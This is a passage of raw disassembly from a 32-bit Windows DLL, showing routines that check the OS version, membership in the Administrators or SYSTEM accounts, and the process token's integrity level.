10006c97:	b8 68 01 01 10       	mov    $0x10010168,%eax
10006c9c:	c3                   	ret
10006c9d:	b8 64 01 01 10       	mov    $0x10010164,%eax
10006ca2:	c3                   	ret
10006ca3:	b8 60 01 01 10       	mov    $0x10010160,%eax
10006ca8:	c3                   	ret
10006ca9:	b8 5c 01 01 10       	mov    $0x1001015c,%eax
10006cae:	c3                   	ret
10006caf:	b8 58 01 01 10       	mov    $0x10010158,%eax
10006cb4:	c3                   	ret
10006cb5:	b8 54 01 01 10       	mov    $0x10010154,%eax
10006cba:	c3                   	ret
10006cbb:	b8 50 01 01 10       	mov    $0x10010150,%eax
10006cc0:	c3                   	ret
10006cc1:	b8 4c 01 01 10       	mov    $0x1001014c,%eax
10006cc6:	c3                   	ret
10006cc7:	b8 48 01 01 10       	mov    $0x10010148,%eax
10006ccc:	c3                   	ret
10006ccd:	b8 44 01 01 10       	mov    $0x10010144,%eax
10006cd2:	c3                   	ret
10006cd3:	91                   	xchg   %eax,%ecx
10006cd4:	6c                   	insb   (%dx),%es:(%edi)
10006cd5:	00 10                	add    %dl,(%eax)
10006cd7:	97                   	xchg   %eax,%edi
10006cd8:	6c                   	insb   (%dx),%es:(%edi)
10006cd9:	00 10                	add    %dl,(%eax)
10006cdb:	9d                   	popf
10006cdc:	6c                   	insb   (%dx),%es:(%edi)
10006cdd:	00 10                	add    %dl,(%eax)
10006cdf:	a3 6c 00 10 a9       	mov    %eax,0xa910006c
10006ce4:	6c                   	insb   (%dx),%es:(%edi)
10006ce5:	00 10                	add    %dl,(%eax)
10006ce7:	af                   	scas   %es:(%edi),%eax
10006ce8:	6c                   	insb   (%dx),%es:(%edi)
10006ce9:	00 10                	add    %dl,(%eax)
10006ceb:	b5 6c                	mov    $0x6c,%ch
10006ced:	00 10                	add    %dl,(%eax)
10006cef:	bb 6c 00 10 c1       	mov    $0xc110006c,%ebx
10006cf4:	6c                   	insb   (%dx),%es:(%edi)
10006cf5:	00 10                	add    %dl,(%eax)
10006cf7:	c7                   	(bad)
10006cf8:	6c                   	insb   (%dx),%es:(%edi)
10006cf9:	00 10                	add    %dl,(%eax)
10006cfb:	55                   	push   %ebp
10006cfc:	8b ec                	mov    %esp,%ebp
10006cfe:	6a ff                	push   $0xffffffff
10006d00:	68 f8 e3 00 10       	push   $0x1000e3f8
10006d05:	68 00 c6 00 10       	push   $0x1000c600
10006d0a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
10006d10:	50                   	push   %eax
10006d11:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
10006d18:	81 ec ac 00 00 00    	sub    $0xac,%esp
10006d1e:	53                   	push   %ebx
10006d1f:	56                   	push   %esi
10006d20:	57                   	push   %edi
10006d21:	89 65 e8             	mov    %esp,-0x18(%ebp)
10006d24:	33 db                	xor    %ebx,%ebx
10006d26:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
10006d29:	88 5d d8             	mov    %bl,-0x28(%ebp)
10006d2c:	88 5d d9             	mov    %bl,-0x27(%ebp)
10006d2f:	88 5d da             	mov    %bl,-0x26(%ebp)
10006d32:	88 5d db             	mov    %bl,-0x25(%ebp)
10006d35:	88 5d dc             	mov    %bl,-0x24(%ebp)
10006d38:	c6 45 dd 05          	movb   $0x5,-0x23(%ebp)
10006d3c:	89 5d e0             	mov    %ebx,-0x20(%ebp)
10006d3f:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10006d42:	6a 01                	push   $0x1
10006d44:	5e                   	pop    %esi
10006d45:	89 75 fc             	mov    %esi,-0x4(%ebp)
10006d48:	c7 85 44 ff ff ff 94 	movl   $0x94,-0xbc(%ebp)
10006d4f:	00 00 00 
10006d52:	8d 85 44 ff ff ff    	lea    -0xbc(%ebp),%eax
10006d58:	50                   	push   %eax
10006d59:	ff 15 b8 e0 00 10    	call   *0x1000e0b8
10006d5f:	85 c0                	test   %eax,%eax
10006d61:	75 05                	jne    0x10006d68
10006d63:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
10006d66:	eb 60                	jmp    0x10006dc8
10006d68:	39 b5 54 ff ff ff    	cmp    %esi,-0xac(%ebp)
10006d6e:	75 05                	jne    0x10006d75
10006d70:	89 75 e4             	mov    %esi,-0x1c(%ebp)
10006d73:	eb 53                	jmp    0x10006dc8
10006d75:	83 bd 54 ff ff ff 02 	cmpl   $0x2,-0xac(%ebp)
10006d7c:	75 09                	jne    0x10006d87
10006d7e:	83 bd 48 ff ff ff 04 	cmpl   $0x4,-0xb8(%ebp)
10006d85:	74 dc                	je     0x10006d63
10006d87:	8d 45 e0             	lea    -0x20(%ebp),%eax
10006d8a:	50                   	push   %eax
10006d8b:	53                   	push   %ebx
10006d8c:	53                   	push   %ebx
10006d8d:	53                   	push   %ebx
10006d8e:	53                   	push   %ebx
10006d8f:	53                   	push   %ebx
10006d90:	53                   	push   %ebx
10006d91:	68 20 02 00 00       	push   $0x220
10006d96:	6a 20                	push   $0x20
10006d98:	6a 02                	push   $0x2
10006d9a:	8d 45 d8             	lea    -0x28(%ebp),%eax
10006d9d:	50                   	push   %eax
10006d9e:	ff 15 34 e0 00 10    	call   *0x1000e034
10006da4:	89 45 e4             	mov    %eax,-0x1c(%ebp)
10006da7:	3b c3                	cmp    %ebx,%eax
10006da9:	74 1d                	je     0x10006dc8
10006dab:	8d 45 e4             	lea    -0x1c(%ebp),%eax
10006dae:	50                   	push   %eax
10006daf:	ff 75 e0             	push   -0x20(%ebp)
10006db2:	53                   	push   %ebx
10006db3:	e8 5d 05 00 00       	call   0x10007315
10006db8:	85 c0                	test   %eax,%eax
10006dba:	74 a7                	je     0x10006d63
10006dbc:	ff 75 e0             	push   -0x20(%ebp)
10006dbf:	ff 15 38 e0 00 10    	call   *0x1000e038
10006dc5:	89 5d e0             	mov    %ebx,-0x20(%ebp)
10006dc8:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10006dcb:	e8 04 00 00 00       	call   0x10006dd4
10006dd0:	eb 1d                	jmp    0x10006def
10006dd2:	33 db                	xor    %ebx,%ebx
10006dd4:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
10006dd7:	74 0c                	je     0x10006de5
10006dd9:	ff 75 e0             	push   -0x20(%ebp)
10006ddc:	ff 15 38 e0 00 10    	call   *0x1000e038
10006de2:	89 5d e0             	mov    %ebx,-0x20(%ebp)
10006de5:	c3                   	ret
10006de6:	eb 07                	jmp    0x10006def
10006de8:	6a 01                	push   $0x1
10006dea:	58                   	pop    %eax
10006deb:	c3                   	ret
10006dec:	8b 65 e8             	mov    -0x18(%ebp),%esp
10006def:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
10006df3:	8b 45 e4             	mov    -0x1c(%ebp),%eax
10006df6:	8b 4d f0             	mov    -0x10(%ebp),%ecx
10006df9:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10006e00:	5f                   	pop    %edi
10006e01:	5e                   	pop    %esi
10006e02:	5b                   	pop    %ebx
10006e03:	c9                   	leave
10006e04:	c3                   	ret
10006e05:	55                   	push   %ebp
10006e06:	8b ec                	mov    %esp,%ebp
10006e08:	6a ff                	push   $0xffffffff
10006e0a:	68 10 e4 00 10       	push   $0x1000e410
10006e0f:	68 00 c6 00 10       	push   $0x1000c600
10006e14:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
10006e1a:	50                   	push   %eax
10006e1b:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
10006e22:	81 ec 1c 04 00 00    	sub    $0x41c,%esp
10006e28:	53                   	push   %ebx
10006e29:	56                   	push   %esi
10006e2a:	57                   	push   %edi
10006e2b:	89 65 e8             	mov    %esp,-0x18(%ebp)
10006e2e:	83 cf ff             	or     $0xffffffff,%edi
10006e31:	89 7d dc             	mov    %edi,-0x24(%ebp)
10006e34:	33 db                	xor    %ebx,%ebx
10006e36:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
10006e39:	89 5d e0             	mov    %ebx,-0x20(%ebp)
10006e3c:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10006e3f:	6a 01                	push   $0x1
10006e41:	5e                   	pop    %esi
10006e42:	89 75 fc             	mov    %esi,-0x4(%ebp)
10006e45:	c7 45 d4 00 01 00 00 	movl   $0x100,-0x2c(%ebp)
10006e4c:	8d 45 d4             	lea    -0x2c(%ebp),%eax
10006e4f:	50                   	push   %eax
10006e50:	8d 85 d0 fd ff ff    	lea    -0x230(%ebp),%eax
10006e56:	50                   	push   %eax
10006e57:	ff 15 2c e0 00 10    	call   *0x1000e02c
10006e5d:	85 c0                	test   %eax,%eax
10006e5f:	0f 84 a4 00 00 00    	je     0x10006f09
10006e65:	88 9d d4 fb ff ff    	mov    %bl,-0x42c(%ebp)
10006e6b:	88 9d d5 fb ff ff    	mov    %bl,-0x42b(%ebp)
10006e71:	88 9d d6 fb ff ff    	mov    %bl,-0x42a(%ebp)
10006e77:	88 9d d7 fb ff ff    	mov    %bl,-0x429(%ebp)
10006e7d:	88 9d d8 fb ff ff    	mov    %bl,-0x428(%ebp)
10006e83:	c6 85 d9 fb ff ff 05 	movb   $0x5,-0x427(%ebp)
10006e8a:	8d 85 6c fd ff ff    	lea    -0x294(%ebp),%eax
10006e90:	89 45 e0             	mov    %eax,-0x20(%ebp)
10006e93:	8d 45 e0             	lea    -0x20(%ebp),%eax
10006e96:	50                   	push   %eax
10006e97:	53                   	push   %ebx
10006e98:	53                   	push   %ebx
10006e99:	53                   	push   %ebx
10006e9a:	53                   	push   %ebx
10006e9b:	53                   	push   %ebx
10006e9c:	53                   	push   %ebx
10006e9d:	53                   	push   %ebx
10006e9e:	6a 12                	push   $0x12
10006ea0:	56                   	push   %esi
10006ea1:	8d 85 d4 fb ff ff    	lea    -0x42c(%ebp),%eax
10006ea7:	50                   	push   %eax
10006ea8:	ff 15 34 e0 00 10    	call   *0x1000e034
10006eae:	89 45 e4             	mov    %eax,-0x1c(%ebp)
10006eb1:	3b c3                	cmp    %ebx,%eax
10006eb3:	74 54                	je     0x10006f09
10006eb5:	68 82 00 00 00       	push   $0x82
10006eba:	53                   	push   %ebx
10006ebb:	8d 85 e0 fc ff ff    	lea    -0x320(%ebp),%eax
10006ec1:	50                   	push   %eax
10006ec2:	e8 4f 64 00 00       	call   0x1000d316
10006ec7:	83 c4 0c             	add    $0xc,%esp
10006eca:	c7 45 d8 40 00 00 00 	movl   $0x40,-0x28(%ebp)
10006ed1:	c7 85 68 fd ff ff 80 	movl   $0x80,-0x298(%ebp)
10006ed8:	00 00 00 
10006edb:	8d 85 64 fd ff ff    	lea    -0x29c(%ebp),%eax
10006ee1:	50                   	push   %eax
10006ee2:	8d 85 68 fd ff ff    	lea    -0x298(%ebp),%eax
10006ee8:	50                   	push   %eax
10006ee9:	8d 85 dc fb ff ff    	lea    -0x424(%ebp),%eax
10006eef:	50                   	push   %eax
10006ef0:	8d 45 d8             	lea    -0x28(%ebp),%eax
10006ef3:	50                   	push   %eax
10006ef4:	8d 85 e0 fc ff ff    	lea    -0x320(%ebp),%eax
10006efa:	50                   	push   %eax
10006efb:	ff 75 e0             	push   -0x20(%ebp)
10006efe:	53                   	push   %ebx
10006eff:	ff 15 30 e0 00 10    	call   *0x1000e030
10006f05:	85 c0                	test   %eax,%eax
10006f07:	75 04                	jne    0x10006f0d
10006f09:	8b f7                	mov    %edi,%esi
10006f0b:	eb 1d                	jmp    0x10006f2a
10006f0d:	8d 85 d0 fd ff ff    	lea    -0x230(%ebp),%eax
10006f13:	50                   	push   %eax
10006f14:	8d 85 e0 fc ff ff    	lea    -0x320(%ebp),%eax
10006f1a:	50                   	push   %eax
10006f1b:	ff 15 e4 e1 00 10    	call   *0x1000e1e4
10006f21:	59                   	pop    %ecx
10006f22:	59                   	pop    %ecx
10006f23:	8b f0                	mov    %eax,%esi
10006f25:	f7 de                	neg    %esi
10006f27:	1b f6                	sbb    %esi,%esi
10006f29:	46                   	inc    %esi
10006f2a:	89 75 dc             	mov    %esi,-0x24(%ebp)
10006f2d:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10006f30:	e8 0b 00 00 00       	call   0x10006f40
10006f35:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
10006f39:	eb 29                	jmp    0x10006f64
10006f3b:	33 db                	xor    %ebx,%ebx
10006f3d:	8b 75 dc             	mov    -0x24(%ebp),%esi
10006f40:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
10006f43:	74 11                	je     0x10006f56
10006f45:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
10006f48:	74 0c                	je     0x10006f56
10006f4a:	ff 75 e0             	push   -0x20(%ebp)
10006f4d:	ff 15 38 e0 00 10    	call   *0x1000e038
10006f53:	89 5d e0             	mov    %ebx,-0x20(%ebp)
10006f56:	c3                   	ret
10006f57:	6a 01                	push   $0x1
10006f59:	58                   	pop    %eax
10006f5a:	c3                   	ret
10006f5b:	8b 65 e8             	mov    -0x18(%ebp),%esp
10006f5e:	83 ce ff             	or     $0xffffffff,%esi
10006f61:	89 75 fc             	mov    %esi,-0x4(%ebp)
10006f64:	8b c6                	mov    %esi,%eax
10006f66:	8b 4d f0             	mov    -0x10(%ebp),%ecx
10006f69:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10006f70:	5f                   	pop    %edi
10006f71:	5e                   	pop    %esi
10006f72:	5b                   	pop    %ebx
10006f73:	c9                   	leave
10006f74:	c3                   	ret
10006f75:	55                   	push   %ebp
10006f76:	8b ec                	mov    %esp,%ebp
10006f78:	6a ff                	push   $0xffffffff
10006f7a:	68 28 e4 00 10       	push   $0x1000e428
10006f7f:	68 00 c6 00 10       	push   $0x1000c600
10006f84:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
10006f8a:	50                   	push   %eax
10006f8b:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
10006f92:	81 ec 08 01 00 00    	sub    $0x108,%esp
10006f98:	53                   	push   %ebx
10006f99:	56                   	push   %esi
10006f9a:	57                   	push   %edi
10006f9b:	89 65 e8             	mov    %esp,-0x18(%ebp)
10006f9e:	6a 01                	push   $0x1
10006fa0:	5f                   	pop    %edi
10006fa1:	89 bd 40 ff ff ff    	mov    %edi,-0xc0(%ebp)
10006fa7:	33 db                	xor    %ebx,%ebx
10006fa9:	89 9d 50 ff ff ff    	mov    %ebx,-0xb0(%ebp)
10006faf:	89 9d 44 ff ff ff    	mov    %ebx,-0xbc(%ebp)
10006fb5:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10006fb8:	89 7d fc             	mov    %edi,-0x4(%ebp)
10006fbb:	ff 15 70 e1 00 10    	call   *0x1000e170
10006fc1:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
10006fc7:	be 94 00 00 00       	mov    $0x94,%esi
10006fcc:	56                   	push   %esi
10006fcd:	53                   	push   %ebx
10006fce:	8d 85 54 ff ff ff    	lea    -0xac(%ebp),%eax
10006fd4:	50                   	push   %eax
10006fd5:	e8 3c 63 00 00       	call   0x1000d316
10006fda:	83 c4 0c             	add    $0xc,%esp
10006fdd:	89 b5 54 ff ff ff    	mov    %esi,-0xac(%ebp)
10006fe3:	8d 85 54 ff ff ff    	lea    -0xac(%ebp),%eax
10006fe9:	50                   	push   %eax
10006fea:	ff 15 b8 e0 00 10    	call   *0x1000e0b8
10006ff0:	85 c0                	test   %eax,%eax
10006ff2:	0f 84 53 01 00 00    	je     0x1000714b
10006ff8:	83 bd 64 ff ff ff 02 	cmpl   $0x2,-0x9c(%ebp)
10006fff:	0f 85 4c 01 00 00    	jne    0x10007151
10007005:	e8 f1 fc ff ff       	call   0x10006cfb
1000700a:	85 c0                	test   %eax,%eax
1000700c:	75 6b                	jne    0x10007079
1000700e:	e8 f2 fd ff ff       	call   0x10006e05
10007013:	85 c0                	test   %eax,%eax
10007015:	75 62                	jne    0x10007079
10007017:	e8 1e 05 00 00       	call   0x1000753a
1000701c:	a3 94 07 01 10       	mov    %eax,0x10010794
10007021:	3b c3                	cmp    %ebx,%eax
10007023:	74 30                	je     0x10007055
10007025:	89 9d 3c ff ff ff    	mov    %ebx,-0xc4(%ebp)
1000702b:	8d 85 3c ff ff ff    	lea    -0xc4(%ebp),%eax
10007031:	50                   	push   %eax
10007032:	ff b5 48 ff ff ff    	push   -0xb8(%ebp)
10007038:	e8 91 12 00 00       	call   0x100082ce
1000703d:	59                   	pop    %ecx
1000703e:	59                   	pop    %ecx
1000703f:	89 85 38 ff ff ff    	mov    %eax,-0xc8(%ebp)
10007045:	3b c3                	cmp    %ebx,%eax
10007047:	0f 85 c7 00 00 00    	jne    0x10007114
1000704d:	89 bd 40 ff ff ff    	mov    %edi,-0xc0(%ebp)
10007053:	eb 06                	jmp    0x1000705b
10007055:	89 9d 40 ff ff ff    	mov    %ebx,-0xc0(%ebp)
1000705b:	a1 94 07 01 10       	mov    0x10010794,%eax
10007060:	3b c3                	cmp    %ebx,%eax
10007062:	74 1b                	je     0x1000707f
10007064:	89 85 0c ff ff ff    	mov    %eax,-0xf4(%ebp)
1000706a:	50                   	push   %eax
1000706b:	ff 15 30 e1 00 10    	call   *0x1000e130
10007071:	89 1d 94 07 01 10    	mov    %ebx,0x10010794
10007077:	eb 06                	jmp    0x1000707f
10007079:	89 bd 40 ff ff ff    	mov    %edi,-0xc0(%ebp)
1000707f:	83 bd 58 ff ff ff 06 	cmpl   $0x6,-0xa8(%ebp)
10007086:	0f 82 c5 00 00 00    	jb     0x10007151
1000708c:	e8 46 01 00 00       	call   0x100071d7
10007091:	89 85 4c ff ff ff    	mov    %eax,-0xb4(%ebp)
10007097:	83 f8 ff             	cmp    $0xffffffff,%eax
1000709a:	0f 84 ab 00 00 00    	je     0x1000714b
100070a0:	bf 00 40 00 00       	mov    $0x4000,%edi
100070a5:	3b c7                	cmp    %edi,%eax
100070a7:	0f 83 a4 00 00 00    	jae    0x10007151
100070ad:	88 9d 30 ff ff ff    	mov    %bl,-0xd0(%ebp)
100070b3:	88 9d 31 ff ff ff    	mov    %bl,-0xcf(%ebp)
100070b9:	88 9d 32 ff ff ff    	mov    %bl,-0xce(%ebp)
100070bf:	88 9d 33 ff ff ff    	mov    %bl,-0xcd(%ebp)
100070c5:	88 9d 34 ff ff ff    	mov    %bl,-0xcc(%ebp)
100070cb:	c6 85 35 ff ff ff 10 	movb   $0x10,-0xcb(%ebp)
100070d2:	8d 8d 44 ff ff ff    	lea    -0xbc(%ebp),%ecx
100070d8:	51                   	push   %ecx
100070d9:	53                   	push   %ebx
100070da:	53                   	push   %ebx
100070db:	53                   	push   %ebx
100070dc:	53                   	push   %ebx
100070dd:	53                   	push   %ebx
100070de:	53                   	push   %ebx
100070df:	53                   	push   %ebx
100070e0:	50                   	push   %eax
100070e1:	6a 01                	push   $0x1
100070e3:	8d 85 30 ff ff ff    	lea    -0xd0(%ebp),%eax
100070e9:	50                   	push   %eax
100070ea:	8b 35 34 e0 00 10    	mov    0x1000e034,%esi
100070f0:	ff d6                	call   *%esi
100070f2:	85 c0                	test   %eax,%eax
100070f4:	74 1e                	je     0x10007114
100070f6:	8d 85 50 ff ff ff    	lea    -0xb0(%ebp),%eax
100070fc:	50                   	push   %eax
100070fd:	53                   	push   %ebx
100070fe:	53                   	push   %ebx
100070ff:	53                   	push   %ebx
10007100:	53                   	push   %ebx
10007101:	53                   	push   %ebx
10007102:	53                   	push   %ebx
10007103:	53                   	push   %ebx
10007104:	57                   	push   %edi
10007105:	6a 01                	push   $0x1
10007107:	8d 85 30 ff ff ff    	lea    -0xd0(%ebp),%eax
1000710d:	50                   	push   %eax
1000710e:	ff d6                	call   *%esi
10007110:	85 c0                	test   %eax,%eax
10007112:	75 08                	jne    0x1000711c
10007114:	ff 15 60 e1 00 10    	call   *0x1000e160
1000711a:	eb 2f                	jmp    0x1000714b
1000711c:	e8 19 04 00 00       	call   0x1000753a
10007121:	a3 94 07 01 10       	mov    %eax,0x10010794
10007126:	3b c3                	cmp    %ebx,%eax
10007128:	74 21                	je     0x1000714b
1000712a:	53                   	push   %ebx
1000712b:	53                   	push   %ebx
1000712c:	53                   	push   %ebx
1000712d:	ff b5 50 ff ff ff    	push   -0xb0(%ebp)
10007133:	ff b5 44 ff ff ff    	push   -0xbc(%ebp)
10007139:	ff b5 48 ff ff ff    	push   -0xb8(%ebp)
1000713f:	e8 e7 1a 00 00       	call   0x10008c2b
10007144:	83 c4 18             	add    $0x18,%esp
10007147:	85 c0                	test   %eax,%eax
10007149:	74 06                	je     0x10007151
1000714b:	89 9d 40 ff ff ff    	mov    %ebx,-0xc0(%ebp)
10007151:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10007154:	e8 04 00 00 00       	call   0x1000715d
10007159:	eb 63                	jmp    0x100071be
1000715b:	33 db                	xor    %ebx,%ebx
1000715d:	a1 94 07 01 10       	mov    0x10010794,%eax
10007162:	3b c3                	cmp    %ebx,%eax
10007164:	74 13                	je     0x10007179
10007166:	89 85 e8 fe ff ff    	mov    %eax,-0x118(%ebp)
1000716c:	50                   	push   %eax
1000716d:	ff 15 30 e1 00 10    	call   *0x1000e130
10007173:	89 1d 94 07 01 10    	mov    %ebx,0x10010794
10007179:	39 9d 50 ff ff ff    	cmp    %ebx,-0xb0(%ebp)
1000717f:	74 12                	je     0x10007193
10007181:	ff b5 50 ff ff ff    	push   -0xb0(%ebp)
10007187:	ff 15 38 e0 00 10    	call   *0x1000e038
1000718d:	89 9d 50 ff ff ff    	mov    %ebx,-0xb0(%ebp)
10007193:	39 9d 44 ff ff ff    	cmp    %ebx,-0xbc(%ebp)
10007199:	74 12                	je     0x100071ad
1000719b:	ff b5 44 ff ff ff    	push   -0xbc(%ebp)
100071a1:	ff 15 38 e0 00 10    	call   *0x1000e038
100071a7:	89 9d 44 ff ff ff    	mov    %ebx,-0xbc(%ebp)
100071ad:	c3                   	ret
100071ae:	eb 0e                	jmp    0x100071be
100071b0:	6a 01                	push   $0x1
100071b2:	58                   	pop    %eax
100071b3:	c3                   	ret
100071b4:	8b 65 e8             	mov    -0x18(%ebp),%esp
100071b7:	83 a5 40 ff ff ff 00 	andl   $0x0,-0xc0(%ebp)
100071be:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
100071c2:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
100071c8:	8b 4d f0             	mov    -0x10(%ebp),%ecx
100071cb:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
100071d2:	5f                   	pop    %edi
100071d3:	5e                   	pop    %esi
100071d4:	5b                   	pop    %ebx
100071d5:	c9                   	leave
100071d6:	c3                   	ret
100071d7:	55                   	push   %ebp
100071d8:	8b ec                	mov    %esp,%ebp
100071da:	6a ff                	push   $0xffffffff
100071dc:	68 40 e4 00 10       	push   $0x1000e440
100071e1:	68 00 c6 00 10       	push   $0x1000c600
100071e6:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
100071ec:	50                   	push   %eax
100071ed:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
100071f4:	83 ec 1c             	sub    $0x1c,%esp
100071f7:	53                   	push   %ebx
100071f8:	56                   	push   %esi
100071f9:	57                   	push   %edi
100071fa:	89 65 e8             	mov    %esp,-0x18(%ebp)
100071fd:	83 4d d8 ff          	orl    $0xffffffff,-0x28(%ebp)
10007201:	33 ff                	xor    %edi,%edi
10007203:	33 db                	xor    %ebx,%ebx
10007205:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
10007208:	89 7d dc             	mov    %edi,-0x24(%ebp)
1000720b:	89 7d e0             	mov    %edi,-0x20(%ebp)
1000720e:	89 7d fc             	mov    %edi,-0x4(%ebp)
10007211:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
10007218:	8d 45 e0             	lea    -0x20(%ebp),%eax
1000721b:	50                   	push   %eax
1000721c:	6a 18                	push   $0x18
1000721e:	ff 15 c8 e0 00 10    	call   *0x1000e0c8
10007224:	50                   	push   %eax
10007225:	ff 15 1c e0 00 10    	call   *0x1000e01c
1000722b:	85 c0                	test   %eax,%eax
1000722d:	0f 84 8a 00 00 00    	je     0x100072bd
10007233:	8d 45 dc             	lea    -0x24(%ebp),%eax
10007236:	50                   	push   %eax
10007237:	57                   	push   %edi
10007238:	57                   	push   %edi
10007239:	6a 19                	push   $0x19
1000723b:	ff 75 e0             	push   -0x20(%ebp)
1000723e:	8b 35 20 e0 00 10    	mov    0x1000e020,%esi
10007244:	ff d6                	call   *%esi
10007246:	85 c0                	test   %eax,%eax
10007248:	75 73                	jne    0x100072bd
1000724a:	ff 15 60 e1 00 10    	call   *0x1000e160
10007250:	89 45 d4             	mov    %eax,-0x2c(%ebp)
10007253:	83 f8 7a             	cmp    $0x7a,%eax
10007256:	75 6b                	jne    0x100072c3
10007258:	ff 75 dc             	push   -0x24(%ebp)
1000725b:	57                   	push   %edi
1000725c:	ff 15 c4 e0 00 10    	call   *0x1000e0c4
10007262:	8b d8                	mov    %eax,%ebx
10007264:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
10007267:	3b df                	cmp    %edi,%ebx
10007269:	74 58                	je     0x100072c3
1000726b:	8d 45 dc             	lea    -0x24(%ebp),%eax
1000726e:	50                   	push   %eax
1000726f:	ff 75 dc             	push   -0x24(%ebp)
10007272:	53                   	push   %ebx
10007273:	6a 19                	push   $0x19
10007275:	ff 75 e0             	push   -0x20(%ebp)
10007278:	ff d6                	call   *%esi
1000727a:	85 c0                	test   %eax,%eax
1000727c:	74 3f                	je     0x100072bd
1000727e:	ff 33                	push   (%ebx)
10007280:	ff 15 24 e0 00 10    	call   *0x1000e024
10007286:	8a 00                	mov    (%eax),%al
10007288:	fe c8                	dec    %al
1000728a:	0f b6 c0             	movzbl %al,%eax
1000728d:	50                   	push   %eax
1000728e:	ff 33                	push   (%ebx)
10007290:	ff 15 28 e0 00 10    	call   *0x1000e028
10007296:	8b 00                	mov    (%eax),%eax
10007298:	89 45 d8             	mov    %eax,-0x28(%ebp)
1000729b:	3d 00 10 00 00       	cmp    $0x1000,%eax
100072a0:	74 21                	je     0x100072c3
100072a2:	3d 00 20 00 00       	cmp    $0x2000,%eax
100072a7:	74 1a                	je     0x100072c3
100072a9:	3d 00 30 00 00       	cmp    $0x3000,%eax
100072ae:	74 13                	je     0x100072c3
100072b0:	3d 00 40 00 00       	cmp    $0x4000,%eax
100072b5:	74 0c                	je     0x100072c3
100072b7:	83 4d d8 ff          	orl    $0xffffffff,-0x28(%ebp)
100072bb:	eb 06                	jmp    0x100072c3
100072bd:	ff 15 60 e1 00 10    	call   *0x1000e160
100072c3:	89 7d fc             	mov    %edi,-0x4(%ebp)
100072c6:	e8 07 00 00 00       	call   0x100072d2
100072cb:	eb 32                	jmp    0x100072ff
100072cd:	33 ff                	xor    %edi,%edi
100072cf:	8b 5d e4             	mov    -0x1c(%ebp),%ebx
100072d2:	39 7d e0             	cmp    %edi,-0x20(%ebp)
100072d5:	74 0c                	je     0x100072e3
100072d7:	ff 75 e0             	push   -0x20(%ebp)
100072da:	ff 15 c0 e0 00 10    	call   *0x1000e0c0
100072e0:	89 7d e0             	mov    %edi,-0x20(%ebp)
100072e3:	3b df                	cmp    %edi,%ebx
100072e5:	74 0a                	je     0x100072f1
100072e7:	53                   	push   %ebx
100072e8:	ff 15 c0 e0 00 10    	call   *0x1000e0c0
100072ee:	89 7d e4             	mov    %edi,-0x1c(%ebp)
100072f1:	c3                   	ret
100072f2:	eb 0b                	jmp    0x100072ff
100072f4:	6a 01                	push   $0x1
100072f6:	58                   	pop    %eax
100072f7:	c3                   	ret
100072f8:	8b 65 e8             	mov    -0x18(%ebp),%esp
100072fb:	83 4d d8 ff          	orl    $0xffffffff,-0x28(%ebp)
100072ff:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
10007303:	8b 45 d8             	mov    -0x28(%ebp),%eax
10007306:	8b 4d f0             	mov    -0x10(%ebp),%ecx
10007309:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10007310:	5f                   	pop    %edi
10007311:	5e                   	pop    %esi
10007312:	5b                   	pop    %ebx
10007313:	c9                   	leave
10007314:	c3                   	ret
10007315:	55                   	push   %ebp
10007316:	8b ec                	mov    %esp,%ebp
10007318:	6a ff                	push   $0xffffffff
1000731a:	68 58 e4 00 10       	push   $0x1000e458
1000731f:	68 00 c6 00 10       	push   $0x1000c600
10007324:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
1000732a:	50                   	push   %eax
1000732b:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
10007332:	81 ec b0 00 00 00    	sub    $0xb0,%esp
10007338:	53                   	push   %ebx
10007339:	56                   	push   %esi
1000733a:	57                   	push   %edi
1000733b:	89 65 e8             	mov    %esp,-0x18(%ebp)
1000733e:	33 db                	xor    %ebx,%ebx
10007340:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
10007343:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10007346:	39 5d 08             	cmp    %ebx,0x8(%ebp)
10007349:	6a 01                	push   $0x1
1000734b:	5e                   	pop    %esi
1000734c:	75 0f                	jne    0x1000735d
1000734e:	56                   	push   %esi
1000734f:	56                   	push   %esi
10007350:	6a 08                	push   $0x8
10007352:	e8 07 01 00 00       	call   0x1000745e
10007357:	83 c4 0c             	add    $0xc,%esp
1000735a:	89 45 08             	mov    %eax,0x8(%ebp)
1000735d:	39 5d 08             	cmp    %ebx,0x8(%ebp)
10007360:	75 08                	jne    0x1000736a
10007362:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
10007365:	e9 dc 00 00 00       	jmp    0x10007446
1000736a:	8d 85 68 ff ff ff    	lea    -0x98(%ebp),%eax
